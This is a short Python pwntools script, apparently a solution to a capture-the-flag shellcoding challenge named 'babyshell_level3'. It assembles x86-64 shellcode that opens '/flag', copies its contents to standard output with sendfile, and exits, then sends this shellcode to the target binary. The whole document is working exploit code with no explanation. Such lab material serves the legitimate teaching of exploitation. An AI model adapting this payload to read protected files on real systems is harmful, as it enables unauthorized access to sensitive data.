#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or "./babyshell_level3")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# -- Exploit goes here --

io = start()

payload = asm(
    """.intel_syntax noprefix

    mov ebx,0x67616c66
    shl rbx,8
    mov bl,0x2f
    push rbx
    
    mov al,2
    mov rdi,rsp
    xor rsi,rsi
    syscall

    mov rsi,rax
    mov al,0x28
    xor edi, edi
    inc rdi

    xor rdx,rdx
    mov r10b,50
    shr r10,40
    syscall

    mov al,0x3c
    xor rdi,rdi
    syscall
    """
)
io.sendline(payload)
io.interactive()
